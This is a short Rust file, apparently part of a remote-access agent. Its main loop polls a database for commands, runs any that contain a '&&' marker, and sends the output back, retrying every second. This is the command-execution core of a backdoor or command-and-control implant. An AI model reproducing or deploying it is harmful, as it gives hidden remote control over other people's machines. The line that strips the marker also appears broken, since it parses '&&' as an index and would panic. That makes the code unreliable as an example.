use std::{thread, time};
use crate::command::exc;
use crate::db::get_command_thread::get_command;
use crate::db::send;

pub fn host_main() {
    loop {
        let mut data = get_command();
        if data.contains("&&") {
            data.remove("&&".parse().unwrap());
            let result = exc(data);
            loop {
                if send(&result).is_ok(){
                    break;
                }
                thread::sleep(time::Duration::from_secs(1));
            }
            thread::sleep(time::Duration::from_secs(1));
        }
    }
}